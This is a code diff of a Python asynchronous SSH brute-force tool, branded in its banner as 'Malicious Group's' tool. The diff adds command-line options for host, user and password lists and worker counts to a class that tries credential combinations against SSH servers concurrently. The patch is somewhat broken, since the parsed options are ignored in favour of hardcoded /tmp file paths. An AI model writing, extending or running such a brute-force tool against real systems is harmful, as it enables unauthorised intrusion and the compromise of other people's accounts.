@@ -1,9 +1,11 @@
 import itertools
 import asyncssh
+import argparse
 import logging
 import asyncio
 import random
 
+from sys import argv
 from pathlib import Path
 
 log = logging.basicConfig(format='sshtfu 🠖 %(message)s', level=logging.WARNING)
@@ -18,7 +20,6 @@ class SshTFU:
         self._workers = int(workers)
         self._timeout_list = []
         self._ignore_list = []
-
 
     @staticmethod
     def _return_list(item):
@@ -42,6 +43,7 @@ class SshTFU:
             random.shuffle(items)
             for h, u, p in items:
                 queue.put_nowait((h, u, p))
+            print(f"\nStarting {self._workers} workers to parse {len(items)} credential pairs...")
             break
 
     async def consumer(self, queue):
@@ -87,7 +89,46 @@ class SshTFU:
             c.cancel()
 
 
+def usage():
+    u = f"""
+    USAGE:
+      {argv[0]} -h "192.168.1.1" -u "admin" -p /path/passwords.txt
+      {argv[0]} -h /path/hosts.txt -u /path/users.txt -p /path/passwords.txt
+      {argv[0]} -h /path/hosts.txt -u /path/users.txt -p /path/passwords.txt -w 20
+
+    OPTIONS:
+      '-h', '--hosts'      - Set the hostname or path to file containing hostnames.
+      '-u', '--users'      - Set the username or path to file containing users.
+      '-p', '--passwords'  - Set the password or path to file containing passwords.
+      '-w', '--workers'    - Set the number of workers to run during attempts.
+
+    """
+    print(u)
+
+
 if __name__ == "__main__":
-    laugh = SshTFU("/tmp/hosts.txt", "/tmp/users.txt", "/tmp/passwords.txt", 20)
-    asyncio.run(laugh.main())
-    print("\n")
+    parser = argparse.ArgumentParser(add_help=False, usage=usage)
+    parser.add_argument('-h', '--host', action='store', dest='hosts', default='')
+    parser.add_argument('-u', '--users', action='store', dest='users', default='')
+    parser.add_argument('-p', '--passwords', action='store', dest='passwords', default='')
+    parser.add_argument('-w', '--workers', action='store', dest='workers', default='')
+    arg = None
+
+    try:
+        arg = parser.parse_args()
+    except TypeError:
+        usage()
+        exit("Invalid options provided. Exiting.")
+
+    if not arg.hosts or not arg.users or not arg.passwords:
+        usage()
+        exit("Required options not provided. Exiting.")
+
+    if not arg.workers:
+        arg.workers = 10
+
+    print(f"\n[ Malicious Group's Asynchronous SSH Bruteforce Tool ]\n")
+
+    MaliciousGroup = SshTFU("/tmp/hosts.txt", "/tmp/users.txt", "/tmp/passwords.txt", 20)
+    asyncio.run(MaliciousGroup.main())
+    print("--fin--")
